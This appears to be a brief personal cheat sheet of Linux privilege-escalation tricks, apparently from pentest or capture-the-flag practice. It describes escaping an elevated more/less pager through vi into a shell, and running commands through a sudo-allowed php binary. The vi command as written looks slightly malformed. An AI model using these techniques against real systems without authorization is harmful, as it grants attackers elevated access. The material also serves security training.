# privilege escalation methods

## more|less > vi

if something is using more/less as an elevated user make the window smaller so it activates more or less
press `v` drops us in vim
using `:#!/bin/bash` we can get a shell

## sudo -l: shows php

try `sudo /usr/bin/php -r "system('whoami');"`
